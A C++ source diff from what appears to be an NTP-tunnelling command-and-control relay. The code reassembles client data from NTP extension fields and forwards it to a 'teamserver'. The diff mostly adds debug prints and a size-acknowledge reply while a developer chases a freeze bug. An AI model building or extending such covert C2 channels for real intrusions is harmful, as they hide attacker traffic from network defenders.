@@ -241,6 +241,7 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
         uint32_t uintClientId = vectorToUint32(clientId);
         auto it = sessions.find(uintClientId);
         if (it != sessions.end()) {
+            std::cout << "Found session" << std::endl;
             if (it->second.fromClientBuffer.size() >= it->second.getFromClientBufferSize()) {
                 std::cout << "[!] More data than expected from client" << std::endl;
                 std::cout << "[!] Expected Size: "
@@ -249,16 +250,26 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
                     << it->second.fromClientBuffer.size() << std::endl;
             }
 
+            std::cout << "ntpPacket.getExtensionData()" << std::endl;
             auto extData = ntpPacket.getExtensionData();
             it->second.fromClientBuffer.insert(
                 it->second.fromClientBuffer.end(), extData.begin(), extData.end());
 
+
+            /*
+            Bug appears to be here. We freeze right after GEt Client buffer size
+            
+            */
+            std::cout << "GEt Client buffer size" << std::endl;
             if (it->second.fromClientBuffer.size() == it->second.getFromClientBufferSize()) {
                 std::cout << "[+] Data from client complete, sending to teamserver" << std::endl;
 
+                
+                std::cout << "Forwarding data to TS" << std::endl;
                 std::vector<uint8_t> frame =
                     forwardToTeamserver(it->second.fromClientBuffer, it->second.getSocket());
 
+                std::cout << "setForClientBuffer" << std::endl;
                 it->second.setForClientBuffer(frame);
                 std::cout << "[+] TS comms complete" << std::endl;
 
@@ -271,6 +282,21 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
 
                 sendNtpPacket(client_addr, sock, newPacketClass.getPacket());
                 it->second.fromClientBuffer.clear();
+                //test setting back to 0
+                //it->second.setFromClientBufferSize(0);
+            }
+            else {
+                std::cout << "[+] Data from client NOT complete, "<< it->second.fromClientBuffer.size() << " of " << it->second.getFromClientBufferSize() << "bytes sent" << std::endl;
+
+                //I think I need to send an size acknowldeg packet?? here, or at least that's what the clietn wants
+                NTPPacket newPacketClass;
+                newPacketClass.addExtensionField(
+                    NtpExtensionField::sizePacketAcknowledge,
+                    {},
+                    Client::emptyClientId
+                );
+
+                sendNtpPacket(client_addr, sock, newPacketClass.getPacket());
             }
         }
         else {
